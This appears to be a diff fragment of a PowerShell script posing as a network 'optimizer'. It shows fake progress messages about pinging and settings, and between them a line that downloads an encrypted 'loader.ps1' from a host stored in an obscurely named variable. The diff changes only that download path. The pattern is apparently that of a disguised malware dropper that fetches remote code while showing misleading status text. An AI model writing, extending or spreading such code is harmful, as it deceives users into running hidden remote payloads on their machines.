@@ -32,7 +32,7 @@ try {
     
 
     Show-Progress -Activity "Sending your max ping..." -Percent 50
-    $encrypted = Invoke-RestMethod "$sUllz/ad/loader.ps1" -TimeoutSec 20
+    $encrypted = Invoke-RestMethod "$sUllz/loader.ps1" -TimeoutSec 20
 
     Show-Progress -Activity "Getting settings for optimizer..." -Percent 70
     
